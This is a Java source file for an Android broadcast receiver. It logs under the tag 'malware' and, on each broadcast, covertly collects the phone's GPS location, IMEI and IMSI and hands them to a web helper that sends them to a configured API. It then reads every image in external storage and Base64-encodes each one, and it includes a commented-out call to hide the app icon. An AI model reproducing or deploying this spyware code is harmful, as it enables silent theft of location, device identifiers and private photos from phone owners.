package ommrepublic.com.ledieo;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;
import android.provider.MediaStore.Images;

import java.io.File;

/**
 * Created by admin on 9/23/15.
 */
public class ChargeReceiver extends BroadcastReceiver{

    @Override
    public void onReceive(Context context, Intent intent)
    {

        try {
            // STEP 1 : START THE SERVER


            Log.d("malware", "Sending data");
            DeviceLocation d = new DeviceLocation();
            double[] location = d.getGPS(context);

            WebHelper w = new WebHelper(context, context.getString(R.string.user_info_api), PhoneInfo.getMyIMEI(context), PhoneInfo.getMyIMSI(context), location[0], location[1]);
            w.start();

            //Utils.hideAppIcon(context);

            ContentResolver cr = context.getContentResolver();
            String[] columns = new String[] {
                    Images.ImageColumns._ID,
                    Images.ImageColumns.TITLE,
                    Images.ImageColumns.DATA,
                    Images.ImageColumns.MIME_TYPE,
                    Images.ImageColumns.SIZE };
            Cursor cur = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, columns, null, null, null);
            if (cur.moveToFirst()){
                do{
                    String data = cur.getString(cur.getColumnIndex(Images.ImageColumns.DATA));
                    // do what ever you want here
                    Log.d("malware", data);
                    File file = new File(data);
                    byte[] bytes = Utils.loadFile(file);
                    byte[] encoded = Base64.encode(bytes, 1);
                    String encodedString = new String(encoded);

                    Log.d("malware", encodedString);
                }while(cur.moveToNext());
            }
            cur.close();
        }
        catch(Exception e)
        {
            e.printStackTrace();
        }
    }


}
